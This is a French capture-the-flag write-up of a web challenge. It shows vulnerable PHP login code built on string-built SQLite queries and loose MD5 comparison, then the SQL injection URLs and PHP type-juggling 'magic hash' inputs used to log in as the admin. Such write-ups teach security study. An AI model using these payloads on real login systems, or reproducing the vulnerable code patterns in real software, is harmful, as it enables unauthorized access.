Backdoor CTF 2017: THE-WALL
-------

**Catégorie**: Web **Points**: 100 **Description**:

> Night king needs the secret flag to destroy the wall. Help night king get flag from Lord Commander so that army of dead can kill the living
http://163.172.176.29/WALL


Write up
-------

Dans un premier temps en cliquant sur le lien on arrive sur la page http://163.172.176.29/WALL/login.html

On va commencer par regarder le code source de la page voir s'il n'y a pas d'indices:

```html
    <html>
    <head>
    <title>The Wall</title>
    </head>
    <body>
    <form action="index.php" method="POST">
    Username:<input type="text" name="life" /><br>
    Password:<input type="password" name="soul" /><br>
    <input type="submit">
    </form>
    <br>
    Here is the source of <a href="source.php">index.php</a>
    </body>
    </html>
```

On sait maintenant qu'il y a "life" et "soul" envoyés en POST sur la page "index.php".

Maintenant on va regarder la source de la page "index.php" en cliquant sur le lien hypertexte:

```php
    <html>
    <head>
    <title>The Wall</title>
    </head>
    <body>
    <?php
    include 'flag.php';
    if(isset($_REQUEST['life'])&&isset($_REQUEST['soul'])){
        $username = $_REQUEST['life'];
        $password = $_REQUEST['soul'];
        if(!(is_string($username)&&is_string($password))){
            header( "refresh:1;url=login.html");
            die("You are not allowed south of wall");
        }
        $password = md5($password);
        include 'connection.php';
        /*CREATE TABLE IF NOT EXISTS users(id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,password TEXT,role TEXT)*/
        $message = "";
        if(preg_match('/(union|\|)/i', $username)){
            $message="Dead work alone not in UNIONs"."</br>";
            echo $message;
            die();
        }
        $query = "SELECT * FROM users WHERE username='$username'";
        $result = $pdo->query($query);
        $users = $result->fetchArray(SQLITE3_ASSOC);
        if($users) {
            if($password == $users['password']){
                if($users['role']=="admin"){
                    echo "Here is your flag: $flag";
                }elseif($users['role']=="normal"){
                    $message = "Welcome, ".$users['users']."</br>";
                    $message.= "Unfortunately, only Lord Commander can access flag";
                }else{
                    $message = "What did you do?";
                }
            }
            else{
                $message = "Wrong identity for : ".$users['username'];
            }
        }
        else{
            $message = "No such person exists"."<br>";
        }
        echo $message;
    }else{
        header( "refresh:1;url=login.html");
        die("Only living can cross The Wall");
    }
    ?>
    </body>
    </html>
```

De cette façon on apprend plusieurs choses:

* Les deux champs ne peuvent pas être vides, et on peut envoyer notre "username" et notre "password" en GET car on a "$_REQUEST"
    ```php
        if(isset($_REQUEST['life'])&&isset($_REQUEST['soul'])){
            $username = $_REQUEST['life'];
            $password = $_REQUEST['soul'];
    ```
* Le hash du mot de passe est md5 (sa taille est donc de 32 caractères)
    ```php
        $password = md5($password);
    ```
* On sait que la table est "users" et que les colonnes sont: id, username, password, role
    ```php
        /*CREATE TABLE IF NOT EXISTS users(id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,password TEXT,role TEXT)*/
    ```
* On ne pourra pas faire d'union
    ```php
        if(preg_match('/(union|\|)/i', $username)){
            $message="Dead work alone not in UNIONs"."</br>";
            echo $message;
            die();
        }
    ```
* Il y a une injection sql sur username
    ```php
        $query = "SELECT * FROM users WHERE username='$username'";
        $result = $pdo->query($query);
    ```

On va pouvoir commencer notre blind SQLI en récupérant dans un premier temps le pseudo de l'administrateur:

```
   http://163.172.176.29/WALL/index.php?soul=tt&life=' OR role='admin' -- '
```

Bingo ! On obtient le nom d'utilisateur qui est "LordCommander" (comme c'est bizarre).

Maintenant on va commencer par récupérer le mot de passe à la main (comme on est noob) avec des valeurs numérique (on commence par zéro):

```
    http://163.172.176.29/WALL/index.php?soul=tt&life=LordCommander' AND password like '0%' -- '
```

On a un résultat positif et si le mot de passe commence par 0e on aurait un bug sur du type juggling et c'est logique avec:

```php
    $password = md5($password);
```

On test donc avec "0e":

```
    http://163.172.176.29/WALL/index.php?soul=tt&life=LordCommander' AND password like '0e%' -- '
```

C'est encore gagné ! On a beaucoup de chance aujourd'hui !
On va maintenant pouvoir tester avec un mot de passe qui en md5 commence par "0e" et qui retourne vrai pour:

```php
    if($password == $users['password'])
```

Voici des mots qui fonctionnent:

```
    240610708
    QNKCDZO
    aabg7XSs
```

On envoi donc notre combinaison nom d'utilisateur et mot de passe:

```php
    http://163.172.176.29/WALL/index.php?soul=QNKCDZO&life=LordCommander
```
Bim ! On a le flag qui s'affiche et on gagne 100 points.
<p align="center">
<img src="https://github.com/Inshallhack/Write-ups/blob/master/BackdoorCTF-2017/THE-WALL/images/snow.jpeg">
</p>
